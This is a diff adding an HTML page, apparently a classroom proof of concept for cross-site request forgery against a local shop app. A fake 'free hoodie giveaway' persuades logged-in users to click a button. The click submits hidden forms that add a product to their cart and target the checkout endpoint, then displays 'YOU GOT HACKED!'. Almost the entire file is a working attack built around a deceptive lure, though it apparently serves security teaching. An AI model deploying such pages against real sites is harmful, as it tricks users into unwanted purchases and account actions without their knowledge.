@@ -1,0 +1,110 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>DETI Memorabilia Shop - GIVEAWAY</title>
+    <style>
+        /* Reset CSS */
+        * {
+            margin: 10;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body, h1, p, button, input {
+            color: white; /* White text */
+        }
+
+        body {
+            background-color: rgb(20, 20, 20); /* Black background */
+            overflow-y: hidden;
+            display: flex; /* Use flexbox to center .contain */
+            align-items:center; /* Center vertically */
+            justify-content: center; /* Center horizontally */
+            height: 100vh; /* Full viewport height */
+        }
+
+        .contain {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            width: 60%;
+            padding: 2rem; /* Reduced padding */
+            text-align: center;
+            z-index: 10;
+            gap: 2rem; /* Adds space between elements */
+        }
+
+        button {
+            background-color: green; /* Green button */
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: darkgreen; /* Darker green on hover */
+        }
+
+        .blur {
+            backdrop-filter: blur(10px);
+            width: 100%;
+            position: absolute; /* Position absolutely to cover the whole page */
+            top: 0;
+            left: 0;
+        }
+    </style>
+    <script src="https://kit.fontawesome.com/8c7f9b8b8a.js" crossorigin="anonymous"></script>
+</head>
+
+
+<body style="overflow-y: hidden;" class="backdrop">
+
+    <form hidden id="hack1" action="http://127.0.0.1:5000/products/add_to_cart/2" method="POST" autocomplete="off">
+        <input type="number" name="quantity" min="1" value="1">
+    </form>
+
+    <form hidden id="hack2" action="http://127.0.0.1:5000/cart/checkout" method="POST">
+    </form>
+    <div class="contain">
+        <h1 class="">Free Giveaway of a DETI's T-Shirt</h1>
+        <p class="">Login and then click this button for a chance to win a free Hoodie of our department!</p>
+
+        <button onClick="hack();" id="button" class="btn text-center buttn">Click
+            here to Participate!</button>
+        <br>
+        <div id="warning"></div>
+    </div>
+</body>
+<script>
+    async function hack() {
+        // document.getElementById("hack").submit();
+        document.getElementById("hack1").addEventListener('submit', function(event) {
+            event.preventDefault();  // Prevent the form from being submitted normally
+
+            let formData = new FormData(event.target);
+
+            fetch(event.target.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => console.log(response))
+            .then(data => console.log(data))
+            .catch(error => console.error(error));
+
+        });
+        document.getElementById("hack1").submit();
+
+        document.getElementById("warning").innerHTML = "YOU GOT HACKED!";
+        console.log(document.getElementById("frame"))
+    }
+</script>
+
+</html>
